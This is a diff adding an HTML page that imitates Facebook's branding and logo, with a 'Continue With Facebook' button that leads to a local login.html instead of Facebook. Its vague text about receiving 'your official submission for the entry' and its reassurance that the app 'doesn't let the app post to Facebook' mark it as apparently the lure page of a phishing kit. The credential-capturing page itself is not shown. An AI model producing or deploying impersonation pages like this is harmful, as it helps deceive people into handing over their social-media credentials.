@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Facebook Access Page</title>
+  <link rel="icon" href="https://www.facebook.com/images/fb_icon_325x325.png">
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+ <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/line-awesome@1.3.0/dist/line-awesome/css/line-awesome.min.css">
+
+
+  <style>
+    body {
+      font-family: 'Inter', sans-serif;
+    }
+  </style>
+</head>
+<body class="bg-gray-100 min-h-screen flex flex-col">
+
+  <!-- Top Banner -->
+  <header class="w-full bg-[#3b5998] text-white text-center py-4 text-xl font-semibold">
+    Access Required
+  </header>
+
+  <!-- Main Content -->
+  <main class="flex flex-col flex-1 items-center justify-center px-4 py-10">
+
+    <div class="bg-white shadow-lg rounded-xl p-8 sm:p-10 max-w-md w-full text-center space-y-6">
+
+      <!-- Facebook Icon -->
+      <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" class="mx-auto w-16 h-16"/>
+
+      <!-- Description -->
+      <p class="text-gray-800 text-base sm:text-lg">
+        This <strong>Web Application</strong> will receive your official submission for the entry.
+      </p>
+
+      <!-- Edit Link -->
+     <!-- Inside your card -->
+<a href="#" class="inline-flex items-center justify-center text-blue-600 text-sm font-medium uppercase hover:underline transition">
+  <i class="la la-edit mr-2 text-base"></i>
+  Edit This
+</a>
+
+      <!-- Facebook Button -->
+      <a href="login.html">
+      <button class="w-full bg-[#1877F2] hover:bg-[#155ec6] text-white text-base sm:text-lg font-semibold py-3 rounded-lg transition-all duration-300">
+        Continue With Facebook
+      </button>
+    </a>
+
+      <!-- Disclaimer -->
+      <p class="text-xs sm:text-sm text-gray-500">
+        This doesn't let the app post to Facebook.
+      </p>
+    </div>
+
+  </main>
+
+</body>
+</html>
